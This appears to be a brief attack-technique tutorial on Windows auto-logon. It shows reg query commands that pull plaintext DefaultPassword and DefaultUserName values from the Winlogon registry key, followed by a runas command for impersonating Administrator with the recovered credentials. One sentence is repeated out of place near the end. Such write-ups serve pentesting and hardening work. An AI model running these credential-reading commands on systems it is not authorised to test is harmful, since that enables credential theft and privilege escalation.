Windows can be configured to automatically log in a user after boot. This is commonly used in kiosk systems or enterprise environments. To achieve this, the system stores login credentials—including plaintext passwords—in the registry. If misconfigured or left exposed, attackers with local access can extract these credentials and use them for privilege escalation or lateral movement.

## Target Registry Keys

These values reside under the following registry path:

```powershell
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

## Registry Queries for Auto-Login Configuration
These values can be queried using the following commands:
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
```
These values can be queried using the following commands:
## Abusing Extracted Credentials

If a password is retrieved, an attacker can impersonate the user:

```powershell
runas /user:Administrator cmd
```